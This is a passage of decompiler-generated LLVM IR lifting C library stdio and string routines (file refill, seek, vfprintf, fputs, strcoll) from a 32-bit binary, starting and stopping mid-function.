  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80584e4 = load i32, i32* %arg1, align 4
  store i32 %v2_80584e4, i32* %esi.global-to-local, align 4
  %v1_80584eb = urem i32 %v2_80584e4, 4
  %v2_80584eb = icmp eq i32 %v1_80584eb, 0
  store i32 %v1_80584eb, i32* @ecx, align 4
  br i1 %v2_80584eb, label %dec_label_pc_805851a, label %dec_label_pc_80584f0

dec_label_pc_80584f0:                             ; preds = %entry
  %v1_80584f2 = add nsw i32 %v1_80584eb, -1
  %v8_80584f2 = icmp eq i32 %v1_80584f2, 0
  store i32 %v1_80584f2, i32* @edx, align 4
  br i1 %v8_80584f2, label %dec_label_pc_805851a, label %dec_label_pc_80584f5

dec_label_pc_80584f5:                             ; preds = %dec_label_pc_80584f0
  %v3_80584f5 = and i32 %v2_80584e4, 2048
  %v4_80584f5 = icmp eq i32 %v3_80584f5, 0
  br i1 %v4_80584f5, label %dec_label_pc_805851a, label %dec_label_pc_80584fa

dec_label_pc_80584fa:                             ; preds = %dec_label_pc_80584f5
  %v6_80584fa = sub nsw i32 1, %v1_80584eb
  %v7_80584fa = and i32 %v1_80584f2, %v6_80584fa
  %v8_80584fa = icmp slt i32 %v7_80584fa, 0
  %v9_80584fa = icmp eq i32 %v1_80584eb, 2
  %v10_80584fa = icmp ult i32 %v1_80584eb, 2
  %v3_80584fd = icmp eq i1 %v10_80584fa, %v8_80584fa
  %v4_80584fd = icmp eq i1 %v9_80584fa, false
  %v5_80584fd = and i1 %v4_80584fd, %v3_80584fd
  br i1 %v5_80584fd, label %dec_label_pc_8058570, label %dec_label_pc_80584ff

dec_label_pc_80584ff:                             ; preds = %dec_label_pc_80584fa
  %v1_80584ff = add i32 %tmp6, 40
  %v2_80584ff = inttoptr i32 %v1_80584ff to i32*
  %v3_80584ff = load i32, i32* %v2_80584ff, align 4
  %v4_80584ff = icmp eq i32 %v3_80584ff, 0
  %v1_8058503 = icmp eq i1 %v4_80584ff, false
  br i1 %v1_8058503, label %dec_label_pc_8058570, label %dec_label_pc_8058505

dec_label_pc_8058505:                             ; preds = %dec_label_pc_80584ff
  %v1_8058505 = add i32 %tmp6, 3
  %v2_8058505 = inttoptr i32 %v1_8058505 to i8*
  %v3_8058505 = load i8, i8* %v2_8058505, align 1
  %v4_8058505 = zext i8 %v3_8058505 to i32
  %v2_8058509 = sub nsw i32 %v1_80584f2, %v4_8058505
  %v1_805850b = add i32 %tmp6, 44
  %v2_805850b = inttoptr i32 %v1_805850b to i32*
  %v3_805850b = load i32, i32* %v2_805850b, align 4
  %v1_805850f = add nsw i32 %v2_8058509, -1
  %tmp12 = icmp slt i32 %v3_805850b, 1
  br i1 %tmp12, label %dec_label_pc_805851a, label %dec_label_pc_8058514

dec_label_pc_8058514:                             ; preds = %dec_label_pc_8058505
  %v1_8058514 = add i32 %tmp6, 2
  %v2_8058514 = inttoptr i32 %v1_8058514 to i8*
  %v3_8058514 = load i8, i8* %v2_8058514, align 1
  %v4_8058514 = zext i8 %v3_8058514 to i32
  %v2_8058518 = sub nsw i32 %v1_805850f, %v4_8058514
  br label %dec_label_pc_805851a

dec_label_pc_805851a:                             ; preds = %dec_label_pc_8058505, %dec_label_pc_80584f5, %dec_label_pc_80584f0, %entry, %dec_label_pc_8058514
  %v0_8058531 = phi i32 [ %v1_805850f, %dec_label_pc_8058505 ], [ %v1_80584f2, %dec_label_pc_80584f5 ], [ 0, %dec_label_pc_80584f0 ], [ 0, %entry ], [ %v2_8058518, %dec_label_pc_8058514 ]
  %v2_805851a = and i32 %v2_80584e4, 64
  %v3_805851a = icmp eq i32 %v2_805851a, 0
  %storemerge.in.in.v = select i1 %v3_805851a, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8058529 = add i32 %tmp6, 16
  %v3_8058529 = inttoptr i32 %v2_8058529 to i32*
  %v4_8058529 = load i32, i32* %v3_8058529, align 4
  %v5_8058529 = sub i32 %storemerge, %v4_8058529
  %v1_805852c = inttoptr i32 %arg2 to i32*
  %v2_805852c = load i32, i32* %v1_805852c, align 4
  store i32 %v2_805852c, i32* @ecx, align 4
  %v1_805852e = add i32 %arg2, 4
  %v2_805852e = inttoptr i32 %v1_805852e to i32*
  %v3_805852e = load i32, i32* %v2_805852e, align 4
  store i32 %v3_805852e, i32* %ebx.global-to-local, align 4
  %v2_8058531 = add i32 %v5_8058529, %v0_8058531
  store i32 %v2_8058531, i32* %esi.global-to-local, align 4
  %v2_805853c = ashr i32 %v2_8058531, 31
  %v5_8058545 = sub i32 %v2_805852c, %v2_8058531
  %v10_8058545 = icmp ult i32 %v2_805852c, %v2_8058531
  %v6_8058549 = zext i1 %v10_8058545 to i32
  %tmp = icmp slt i32 %v2_8058531, 0
  %v2_805853c.neg = zext i1 %tmp to i32
  %v7_8058549 = add i32 %v3_805852e, %v2_805853c.neg
  %v8_8058549 = add i32 %v7_8058549, %v6_8058549
  store i32 %v8_8058549, i32* @edx, align 4
  store i32 %v5_8058545, i32* %v1_805852c, align 4
  %v0_805854f = load i32, i32* @edx, align 4
  %v1_805854f = load i32, i32* %edi.global-to-local, align 4
  %v2_805854f = add i32 %v1_805854f, 4
  %v3_805854f = inttoptr i32 %v2_805854f to i32*
  store i32 %v0_805854f, i32* %v3_805854f, align 4
  %v0_8058552 = load i32, i32* %edi.global-to-local, align 4
  %v1_8058552 = add i32 %v0_8058552, 4
  %v2_8058552 = inttoptr i32 %v1_8058552 to i32*
  %v3_8058552 = load i32, i32* %v2_8058552, align 4
  %v4_8058552 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8058555 = icmp slt i32 %v3_8058552, %v4_8058552
  br i1 %v5_8058555, label %dec_label_pc_805855f, label %dec_label_pc_8058557

dec_label_pc_8058557:                             ; preds = %dec_label_pc_805851a
  %v8_8058557 = icmp sgt i32 %v3_8058552, %v4_8058552
  br i1 %v8_8058557, label %dec_label_pc_805855d, label %dec_label_pc_8058559

dec_label_pc_8058559:                             ; preds = %dec_label_pc_8058557
  %v1_8058559 = inttoptr i32 %v0_8058552 to i32*
  %v2_8058559 = load i32, i32* %v1_8058559, align 4
  %v3_8058559 = load i32, i32* @ecx, align 4
  %tmp14 = icmp ugt i32 %v2_8058559, %v3_8058559
  br i1 %tmp14, label %dec_label_pc_805855d, label %dec_label_pc_805855f

dec_label_pc_805855d:                             ; preds = %dec_label_pc_8058559, %dec_label_pc_8058557
  %v0_805855d = load i32, i32* %esi.global-to-local, align 4
  %v1_805855d = sub i32 0, %v0_805855d
  store i32 %v1_805855d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805855f

dec_label_pc_805855f:                             ; preds = %dec_label_pc_8058559, %dec_label_pc_805851a, %dec_label_pc_805855d
  %v0_805855f = load i32, i32* %esi.global-to-local, align 4
  %v2_805855f = icmp slt i32 %v0_805855f, 0
  %v1_8058561 = icmp eq i1 %v2_805855f, false
  br i1 %v1_8058561, label %dec_label_pc_8058573, label %dec_label_pc_8058563

dec_label_pc_8058563:                             ; preds = %dec_label_pc_805855f
  %v1_8058563 = call i32 @__errno_location(i32 %v2_805853c)
  %v1_8058568 = inttoptr i32 %v1_8058563 to i32*
  store i32 75, i32* %v1_8058568, align 4
  %v0_8058576.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8058573

dec_label_pc_8058570:                             ; preds = %dec_label_pc_80584ff, %dec_label_pc_80584fa
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8058573

dec_label_pc_8058573:                             ; preds = %dec_label_pc_805855f, %dec_label_pc_8058563, %dec_label_pc_8058570
  %v0_8058576 = phi i32 [ %v0_805855f, %dec_label_pc_805855f ], [ %v0_8058576.pre, %dec_label_pc_8058563 ], [ -1, %dec_label_pc_8058570 ]
  ret i32 %v0_8058576

; uselistorder directives
  uselistorder i32 %v4_8058552, { 1, 0 }
  uselistorder i32 %v3_8058552, { 1, 0 }
  uselistorder i32 %v1_80584f2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_80584eb, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_80584e4, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 1, 0, 4, 2, 3, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058573, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805855f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805851a, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_805857c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8058584 = add i32 %arg1, 8
  %v2_8058584 = inttoptr i32 %v1_8058584 to i32*
  %v3_8058584 = load i32, i32* %v2_8058584, align 4
  store i32 %v3_8058584, i32* %edx.global-to-local, align 4
  %v1_8058587 = add i32 %arg1, 12
  %v2_8058587 = inttoptr i32 %v1_8058587 to i32*
  %v3_8058587 = load i32, i32* %v2_8058587, align 4
  %v2_805858a = sub i32 %v3_8058587, %v3_8058584
  %v3_805858f = inttoptr i32 %arg1 to i16*
  %v4_805858f = call i32 @__stdio_READ(i16* %v3_805858f, i32 %v3_8058584, i32 %v2_805858a)
  %v0_8058594 = load i32, i32* @ebx, align 4
  %v1_8058594 = add i32 %v0_8058594, 8
  %v2_8058594 = inttoptr i32 %v1_8058594 to i32*
  %v3_8058594 = load i32, i32* %v2_8058594, align 4
  store i32 %v3_8058594, i32* %edx.global-to-local, align 4
  %v2_8058597 = add i32 %v0_8058594, 16
  %v3_8058597 = inttoptr i32 %v2_8058597 to i32*
  store i32 %v3_8058594, i32* %v3_8058597, align 4
  %v0_805859a = load i32, i32* %edx.global-to-local, align 4
  %v2_805859a = add i32 %v0_805859a, %v4_805858f
  store i32 %v2_805859a, i32* %edx.global-to-local, align 4
  %v1_805859c = load i32, i32* @ebx, align 4
  %v2_805859c = add i32 %v1_805859c, 20
  %v3_805859c = inttoptr i32 %v2_805859c to i32*
  store i32 %v2_805859a, i32* %v3_805859c, align 4
  store i32 %v0_805857c, i32* @ebx, align 4
  ret i32 %v4_805858f

; uselistorder directives
  uselistorder i32 %v4_805858f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80585a4 = load i32, i32* @ebx, align 4
  %v4_80585a8 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80585a8, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_80585b0 = bitcast i16* %arg1 to i32*
  %v2_80585b0 = load i32, i32* %v1_80585b0, align 4
  %v1_80585b2 = urem i32 %v2_80585b0, 65536
  %v2_80585b5 = and i32 %v1_80585b2, %arg2
  %v3_80585b5 = icmp eq i32 %v2_80585b5, 0
  %v1_80585b7 = icmp eq i1 %v3_80585b5, false
  br i1 %v1_80585b7, label %dec_label_pc_80585c6, label %dec_label_pc_80585b9

dec_label_pc_80585b9:                             ; preds = %entry
  %v1_80585b9 = and i32 %v2_80585b0, 2176
  %v2_80585b9 = icmp eq i32 %v1_80585b9, 0
  %v1_80585bf = icmp eq i1 %v2_80585b9, false
  br i1 %v1_80585bf, label %dec_label_pc_80585cd, label %dec_label_pc_80585c1

dec_label_pc_80585c1:                             ; preds = %dec_label_pc_80585b9
  %v2_80585c1 = or i32 %v2_80585b0, %arg2
  %v1_80585c3 = trunc i32 %v2_80585c1 to i16
  store i16 %v1_80585c3, i16* %arg1, align 2
  %v0_80585c6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80585c6

dec_label_pc_80585c6:                             ; preds = %entry, %dec_label_pc_80585c1
  %v0_80585e8 = phi i32 [ %v4_80585a8, %entry ], [ %v0_80585c6.pre, %dec_label_pc_80585c1 ]
  %v1_80585c6 = inttoptr i32 %v0_80585e8 to i16*
  %v2_80585c6 = load i16, i16* %v1_80585c6, align 2
  %v2_80585c9 = and i16 %v2_80585c6, 16
  %v3_80585c9 = icmp eq i16 %v2_80585c9, 0
  br i1 %v3_80585c9, label %dec_label_pc_80585e1, label %dec_label_pc_80585cd

dec_label_pc_80585cd:                             ; preds = %dec_label_pc_80585c6, %dec_label_pc_80585b9
  %v1_80585cd = call i32 @__errno_location(i32 %v0_80585a4)
  %v1_80585d2 = inttoptr i32 %v1_80585cd to i32*
  store i32 9, i32* %v1_80585d2, align 4
  br label %dec_label_pc_80585d8

dec_label_pc_80585d8:                             ; preds = %dec_label_pc_80585e5, %dec_label_pc_80585cd
  %v0_80585d8 = load i32, i32* @ebx, align 4
  %v1_80585d8 = inttoptr i32 %v0_80585d8 to i16*
  %v2_80585d8 = load i16, i16* %v1_80585d8, align 2
  %v3_80585d8 = or i16 %v2_80585d8, 8
  store i16 %v3_80585d8, i16* %v1_80585d8, align 2
  br label %dec_label_pc_8058605

dec_label_pc_80585e1:                             ; preds = %dec_label_pc_80585c6
  %v2_80585e1 = and i16 %v2_80585c6, 64
  %v3_80585e1 = icmp eq i16 %v2_80585e1, 0
  br i1 %v3_80585e1, label %dec_label_pc_80585ff, label %dec_label_pc_80585e5

dec_label_pc_80585e5:                             ; preds = %dec_label_pc_80585e1
  %v2_80585e9 = call i32 @__stdio_wcommit(i32 %v0_80585e8)
  %v1_80585f1 = icmp eq i32 %v2_80585e9, 0
  %v1_80585f3 = icmp eq i1 %v1_80585f1, false
  br i1 %v1_80585f3, label %dec_label_pc_80585d8, label %dec_label_pc_80585f5

dec_label_pc_80585f5:                             ; preds = %dec_label_pc_80585e5
  %v0_80585f5 = load i32, i32* @ebx, align 4
  %v1_80585f5 = inttoptr i32 %v0_80585f5 to i16*
  %v2_80585f5 = load i16, i16* %v1_80585f5, align 2
  %v3_80585f5 = and i16 %v2_80585f5, -65
  store i16 %v3_80585f5, i16* %v1_80585f5, align 2
  %v0_80585f9 = load i32, i32* @ebx, align 4
  %v1_80585f9 = add i32 %v0_80585f9, 8
  %v2_80585f9 = inttoptr i32 %v1_80585f9 to i32*
  %v3_80585f9 = load i32, i32* %v2_80585f9, align 4
  %v2_80585fc = add i32 %v0_80585f9, 28
  %v3_80585fc = inttoptr i32 %v2_80585fc to i32*
  store i32 %v3_80585f9, i32* %v3_80585fc, align 4
  %v0_80585ff.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80585ff

dec_label_pc_80585ff:                             ; preds = %dec_label_pc_80585e1, %dec_label_pc_80585f5
  %v9_80585ff = phi i32 [ %v0_80585e8, %dec_label_pc_80585e1 ], [ %v0_80585ff.pre, %dec_label_pc_80585f5 ]
  %v1_80585ff = inttoptr i32 %v9_80585ff to i16*
  %v2_80585ff = load i16, i16* %v1_80585ff, align 2
  %v3_80585ff = or i16 %v2_80585ff, 1
  store i16 %v3_80585ff, i16* %v1_80585ff, align 2
  br label %dec_label_pc_8058605

dec_label_pc_8058605:                             ; preds = %dec_label_pc_80585d8, %dec_label_pc_80585ff
  %storemerge = phi i32 [ 0, %dec_label_pc_80585ff ], [ -1, %dec_label_pc_80585d8 ]
  store i32 %v0_80585a4, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_80585b0, { 1, 2, 0 }
  uselistorder i32 %v0_80585a4, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 3, 2, 1, 8, 7, 5, 4, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8058605, { 1, 0 }
  uselistorder label %dec_label_pc_80585ff, { 1, 0 }
  uselistorder label %dec_label_pc_80585c6, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8058618 = add i32 %tmp5, 4
  %v2_8058618 = inttoptr i32 %v1_8058618 to i32*
  %v3_8058618 = load i32, i32* %v2_8058618, align 4
  %v2_805861b = load i32, i32* %arg2, align 4
  %v1_8058621 = add i32 %arg1, 4
  %v2_8058621 = inttoptr i32 %v1_8058621 to i32*
  %v3_8058621 = load i32, i32* %v2_8058621, align 4
  %v4_8058624 = call i32 @__libc_lseek64(i32 %v3_8058621, i32 %v2_805861b, i32 %v3_8058618, i32 %arg3)
  %v0_805862e = load i32, i32* @edx, align 4
  %v2_805862e = icmp slt i32 %v0_805862e, 0
  br i1 %v2_805862e, label %dec_label_pc_8058639, label %dec_label_pc_8058632

dec_label_pc_8058632:                             ; preds = %entry
  %v1_8058632 = load i32, i32* @ebx, align 4
  %v2_8058632 = inttoptr i32 %v1_8058632 to i32*
  store i32 %v4_8058624, i32* %v2_8058632, align 4
  %v0_8058634 = load i32, i32* @edx, align 4
  %v1_8058634 = load i32, i32* @ebx, align 4
  %v2_8058634 = add i32 %v1_8058634, 4
  %v3_8058634 = inttoptr i32 %v2_8058634 to i32*
  store i32 %v0_8058634, i32* %v3_8058634, align 4
  br label %dec_label_pc_8058639

dec_label_pc_8058639:                             ; preds = %entry, %dec_label_pc_8058632
  %v0_8058639 = phi i32 [ %v4_8058624, %entry ], [ 0, %dec_label_pc_8058632 ]
  ret i32 %v0_8058639

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8058639, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8058640 = load i32, i32* @edi, align 4
  %v0_8058642 = load i32, i32* @ebx, align 4
  %v4_8058646 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8058646, i32* @esi, align 4
  %v1_805864a = add i32 %v4_8058646, 52
  %v2_805864a = inttoptr i32 %v1_805864a to i32*
  %v3_805864a = load i32, i32* %v2_805864a, align 4
  store i32 %v3_805864a, i32* @edi, align 4
  %v1_805864d = icmp eq i32 %v3_805864a, 0
  %v1_805864f = icmp eq i1 %v1_805864d, false
  br i1 %v1_805864f, label %dec_label_pc_8058670, label %dec_label_pc_8058651

dec_label_pc_8058651:                             ; preds = %entry
  %v1_8058651 = add i32 %v4_8058646, 56
  store i32 %v1_8058651, i32* @ebx, align 4
  %v5_8058660 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134540701, i32 %v1_8058651)
  %v0_8058665 = load i32, i32* @ebx, align 4
  %v2_8058668 = call i32 @pthread_mutex_lock(i32 %v0_8058665)
  %v0_8058670.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058670

dec_label_pc_8058670:                             ; preds = %entry, %dec_label_pc_8058651
  %v0_8058686 = phi i32 [ %v4_8058646, %entry ], [ %v0_8058670.pre, %dec_label_pc_8058651 ]
  %v1_8058670 = inttoptr i32 %v0_8058686 to i16*
  %v2_8058670 = load i16, i16* %v1_8058670, align 2
  %v1_8058673 = and i16 %v2_8058670, 192
  %v6_8058678 = icmp eq i16 %v1_8058673, 192
  br i1 %v6_8058678, label %dec_label_pc_8058670.dec_label_pc_8058696_crit_edge, label %dec_label_pc_805867f

dec_label_pc_8058670.dec_label_pc_8058696_crit_edge: ; preds = %dec_label_pc_8058670
  br label %dec_label_pc_8058696

dec_label_pc_805867f:                             ; preds = %dec_label_pc_8058670
  %v0_805867f = load i32, i32* @ecx, align 4
  %v6_8058687 = call i32 @__stdio_trans2w_o(i16* %v1_8058670, i32 128, i32 %v0_805867f, i32 %v0_805867f)
  store i32 -1, i32* @ebx, align 4
  %v1_8058692 = icmp eq i32 %v6_8058687, 0
  %v1_8058694 = icmp eq i1 %v1_8058692, false
  br i1 %v1_8058694, label %dec_label_pc_80586aa, label %dec_label_pc_805867f.dec_label_pc_8058696_crit_edge

dec_label_pc_805867f.dec_label_pc_8058696_crit_edge: ; preds = %dec_label_pc_805867f
  %v0_805869f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058696

dec_label_pc_8058696:                             ; preds = %dec_label_pc_8058670.dec_label_pc_8058696_crit_edge, %dec_label_pc_805867f.dec_label_pc_8058696_crit_edge
  %v0_805869f = phi i32 [ %v0_8058686, %dec_label_pc_8058670.dec_label_pc_8058696_crit_edge ], [ %v0_805869f.pre, %dec_label_pc_805867f.dec_label_pc_8058696_crit_edge ]
  %v0_8058696 = load i32, i32* @edx, align 4
  %v5_80586a0 = inttoptr i32 %arg2 to i8*
  %v6_80586a0 = call i32 @_vfprintf_internal(i32 %v0_805869f, i8* %v5_80586a0, i32 %arg3, i32 %v0_8058696)
  store i32 %v6_80586a0, i32* @ebx, align 4
  br label %dec_label_pc_80586aa

dec_label_pc_80586aa:                             ; preds = %dec_label_pc_805867f, %dec_label_pc_8058696
  %v0_80586c27 = phi i32 [ -1, %dec_label_pc_805867f ], [ %v6_80586a0, %dec_label_pc_8058696 ]
  br i1 %v1_805864f, label %dec_label_pc_80586bf, label %dec_label_pc_80586ae

dec_label_pc_80586ae:                             ; preds = %dec_label_pc_80586aa
  %v4_80586b7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_80586c2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80586bf

dec_label_pc_80586bf:                             ; preds = %dec_label_pc_80586aa, %dec_label_pc_80586ae
  %v0_80586c2 = phi i32 [ %v0_80586c27, %dec_label_pc_80586aa ], [ %v0_80586c2.pre, %dec_label_pc_80586ae ]
  store i32 %v0_8058642, i32* @ebx, align 4
  store i32 %v0_8058640, i32* @edi, align 4
  ret i32 %v0_80586c2

; uselistorder directives
  uselistorder i32 (i32, i8*, i32, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder i32 (i16*, i32, i32, i32)* @__stdio_trans2w_o, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80586bf, { 1, 0 }
  uselistorder label %dec_label_pc_80586aa, { 1, 0 }
  uselistorder label %dec_label_pc_8058696, { 1, 0 }
  uselistorder label %dec_label_pc_8058670, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_80586c8 = load i32, i32* @edi, align 4
  %v0_80586c9 = load i32, i32* @esi, align 4
  %v0_80586ca = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v1_80586d2 = add i32 %arg2, 52
  %v2_80586d2 = inttoptr i32 %v1_80586d2 to i32*
  %v3_80586d2 = load i32, i32* %v2_80586d2, align 4
  store i32 %v3_80586d2, i32* @edi, align 4
  %v1_80586d5 = icmp eq i32 %v3_80586d2, 0
  %v1_80586d7 = icmp eq i1 %v1_80586d5, false
  br i1 %v1_80586d7, label %entry.dec_label_pc_80586f8_crit_edge, label %dec_label_pc_80586d9

entry.dec_label_pc_80586f8_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80586f8

dec_label_pc_80586d9:                             ; preds = %entry
  %v1_80586d9 = add i32 %arg2, 56
  store i32 %v1_80586d9, i32* @ebx, align 4
  %v4_80586e8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134540701, i32 %v1_80586d9)
  %v0_80586ed = load i32, i32* @ebx, align 4
  %v1_80586f0 = call i32 @pthread_mutex_lock(i32 %v0_80586ed)
  %v0_80586fa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80586f8

dec_label_pc_80586f8:                             ; preds = %entry.dec_label_pc_80586f8_crit_edge, %dec_label_pc_80586d9
  %v0_80586fa = phi i32 [ %arg2, %entry.dec_label_pc_80586f8_crit_edge ], [ %v0_80586fa.pre, %dec_label_pc_80586d9 ]
  %v0_80586f8 = load i32, i32* @edx, align 4
  %v4_80586ff = inttoptr i32 %arg1 to i8*
  %v5_80586ff = call i32 @__GI_fputs_unlocked(i8* %v4_80586ff, i32 %v0_80586fa, i32 %v0_80586f8, i32 %v0_80586f8)
  store i32 %v5_80586ff, i32* @ebx, align 4
  br i1 %v1_80586d7, label %dec_label_pc_805871e, label %dec_label_pc_805870d

dec_label_pc_805870d:                             ; preds = %dec_label_pc_80586f8
  %v3_8058716 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_8058721.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805871e

dec_label_pc_805871e:                             ; preds = %dec_label_pc_80586f8, %dec_label_pc_805870d
  %v0_8058721 = phi i32 [ %v5_80586ff, %dec_label_pc_80586f8 ], [ %v0_8058721.pre, %dec_label_pc_805870d ]
  store i32 %v0_80586ca, i32* @ebx, align 4
  store i32 %v0_80586c9, i32* @esi, align 4
  store i32 %v0_80586c8, i32* @edi, align 4
  ret i32 %v0_8058721

; uselistorder directives
  uselistorder i32 (i32*, i32)* @__pthread_cleanup_pop_restore, { 29, 28, 30, 32, 33, 7, 8, 9, 10, 11, 12, 13, 31, 36, 6, 0, 1, 27, 37, 34, 35, 14, 16, 17, 18, 19, 20, 15, 21, 2, 22, 23, 3, 4, 5, 24, 25, 26 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 13, 15, 14, 10, 11, 39, 38, 37, 36, 35, 34, 33, 12, 4, 40, 52, 51, 19, 3, 0, 2, 8, 9, 32, 30, 29, 28, 27, 26, 31, 25, 44, 24, 23, 43, 42, 41, 22, 21, 20, 50, 49, 53, 1, 5, 18, 7, 6, 48, 47, 46, 45, 17, 16 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 30, 28, 29, 33, 32, 7, 8, 9, 10, 11, 12, 13, 31, 36, 6, 0, 1, 27, 37, 35, 34, 14, 16, 17, 18, 19, 20, 15, 21, 2, 22, 23, 3, 4, 5, 24, 25, 26 }
  uselistorder i32 134540701, { 2, 3, 4, 5, 6, 7, 36, 39, 40, 41, 42, 43, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 26, 27, 28, 18, 19, 20, 21, 22, 23, 29, 37, 30, 38, 31, 32, 35, 24, 33, 34, 25 }
  uselistorder i32 52, { 21, 19, 20, 1, 12, 0, 4, 5, 6, 23, 24, 13, 15, 11, 18, 22, 16, 17, 8, 9, 10, 7, 3, 2, 14 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805871e, { 1, 0 }
  uselistorder label %dec_label_pc_80586f8, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_805872a = ptrtoint i8* %arg1 to i32
  %v4_8058732.pre = load i32, i32* @eax, align 4
  %v8_8058732.pre = load i1, i1* @df, align 1
  %v9_8058732 = select i1 %v8_8058732.pre, i32 -1, i32 1
  br label %dec_label_pc_8058732

dec_label_pc_8058732:                             ; preds = %dec_label_pc_8058736, %entry
  %v20_8058733 = phi i32 [ %v23_8058733, %dec_label_pc_8058736 ], [ %arg2, %entry ]
  %v4_8058732 = phi i32 [ %v6_8058732, %dec_label_pc_8058736 ], [ %v4_8058732.pre, %entry ]
  %v7_8058732 = phi i32 [ %v10_8058732, %dec_label_pc_8058736 ], [ %v4_805872a, %entry ]
  %v1_8058732 = inttoptr i32 %v7_8058732 to i8*
  %v2_8058732 = load i8, i8* %v1_8058732, align 1
  %v3_8058733 = inttoptr i32 %v20_8058733 to i8*
  %v4_8058733 = load i8, i8* %v3_8058733, align 1
  %v15_8058733 = icmp eq i8 %v2_8058732, %v4_8058733
  %v1_8058734 = icmp eq i1 %v15_8058733, false
  br i1 %v1_8058734, label %dec_label_pc_805873e, label %dec_label_pc_8058736

dec_label_pc_8058736:                             ; preds = %dec_label_pc_8058732
  %v3_8058732 = zext i8 %v2_8058732 to i32
  %v5_8058732 = and i32 %v4_8058732, -256
  %v6_8058732 = or i32 %v3_8058732, %v5_8058732
  %v23_8058733 = add i32 %v20_8058733, %v9_8058732
  %v10_8058732 = add i32 %v7_8058732, %v9_8058732
  %v4_8058736 = icmp eq i8 %v2_8058732, 0
  %v1_8058738 = icmp eq i1 %v4_8058736, false
  br i1 %v1_8058738, label %dec_label_pc_8058732, label %dec_label_pc_8058742

dec_label_pc_805873e:                             ; preds = %dec_label_pc_8058732
  br label %dec_label_pc_8058742

dec_label_pc_8058742:                             ; preds = %dec_label_pc_8058736, %dec_label_pc_805873e
  %storemerge = phi i32 [ 1, %dec_label_pc_805873e ], [ 0, %dec_label_pc_8058736 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8058732, { 1, 2, 0 }
  uselistorder i32 %v9_8058732, { 1, 0 }
  uselistorder label %dec_label_pc_8058742, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
